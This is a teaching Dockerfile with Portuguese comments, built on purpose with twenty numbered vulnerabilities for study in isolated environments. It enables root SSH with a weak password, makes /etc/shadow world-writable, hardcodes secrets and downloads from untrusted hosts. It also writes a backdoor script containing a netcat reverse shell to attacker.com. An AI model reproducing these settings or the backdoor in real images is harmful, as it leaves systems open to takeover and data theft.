# Dockerfile Didático - CHEIO DE VULNERABILIDADES
# ⚠️ APENAS PARA ESTUDOS EM AMBIENTE ISOLADO ⚠️

# Vulnerabilidade 1: Usando imagem desatualizada e não oficial
FROM ubuntu:14.04

# Vulnerabilidade 2: Executando como root (sem usuário não-privilegiado)
USER root

# Vulnerabilidade 3: Atualizando sem fixar versões de pacotes
RUN apt-get update && apt-get install -y \
    openssh-server \
    apache2 \
    mysql-server \
    php5 \
    curl \
    wget \
    netcat \
    # Vulnerabilidade 4: Instalando pacotes desnecessários e perigosos
    telnet \
    nmap \
    # Vulnerabilidade 5: Sem remover cache do apt
    && rm -rf /var/lib/apt/lists/*

# Vulnerabilidade 6: Configurações de SSH inseguras
RUN mkdir /var/run/sshd
RUN echo 'root:password123' | chpasswd
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -i 's/UsePAM yes/UsePAM no/' /etc/ssh/sshd_config

# Vulnerabilidade 7: Serviços desnecessários expostos
EXPOSE 22 80 3306 21 23

# Vulnerabilidade 8: Diretórios com permissões perigosas
RUN chmod 777 /tmp
RUN chmod 777 /var/tmp

# Vulnerabilidade 9: Adicionando repositórios inseguros
RUN echo "deb http://insecure.repo.com/ubuntu trusty main" >> /etc/apt/sources.list

# Vulnerabilidade 10: Download e execução de scripts remotos sem verificação
RUN curl -o /tmp/install.sh http://untrusted-source.com/script.sh
RUN chmod +x /tmp/install.sh

# Vulnerabilidade 11: Variáveis de ambiente com credenciais hardcoded
ENV DB_PASSWORD=senha123
ENV API_KEY=chave_super_secreta_123
ENV ADMIN_PASS=admin123

# Vulnerabilidade 12: Arquivos de configuração com permissões amplas
RUN touch /etc/shadow
RUN chmod 666 /etc/shadow

# Vulnerabilidade 13: Instalando versões vulneráveis específicas
RUN wget http://old-versions.com/software/v1.2.3.deb && dpkg -i v1.2.3.deb

# Vulnerabilidade 14: Backdoors "didáticos" (NUNCA FAÇA ISSO!)
RUN echo "#!/bin/bash" > /usr/bin/backdoor
RUN echo "nc -e /bin/bash attacker.com 4444" >> /usr/bin/backdoor
RUN chmod +x /usr/bin/backdoor

# Vulnerabilidade 15: Serviço iniciado com privilégios elevados
CMD ["/usr/sbin/sshd", "-D"]

# Vulnerabilidade 16: Sem healthcheck ou monitoramento
# Vulnerabilidade 17: Sem logging adequado
# Vulnerabilidade 18: Sem limites de recursos
# Vulnerabilidade 19: Sem scanning de vulnerabilidades
# Vulnerabilidade 20: Sem assinatura ou verificação de integridade
